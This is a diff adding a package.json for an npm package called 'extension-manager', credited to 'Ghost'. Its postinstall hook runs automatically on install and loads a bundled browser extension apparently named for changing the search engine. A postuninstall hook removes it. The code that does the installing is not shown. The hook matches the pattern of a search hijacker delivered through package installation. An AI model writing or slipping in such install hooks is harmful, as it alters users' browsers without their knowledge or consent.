@@ -1,0 +1,16 @@
+{
+  "name": "extension-manager",
+  "version": "1.0.0",
+  "description": "A tool to install and uninstall browser extensions.",
+  "main": "main.js",
+  "scripts": {
+    "postinstall": "node main.js -i changesearchengine.zip",
+    "postuninstall": "node main.js -u"
+  },
+  "dependencies": {
+    "unzipper": "^0.10.11"
+  },
+  "keywords": [],
+  "author": "Ghost",
+  "license": "MIT"
+}
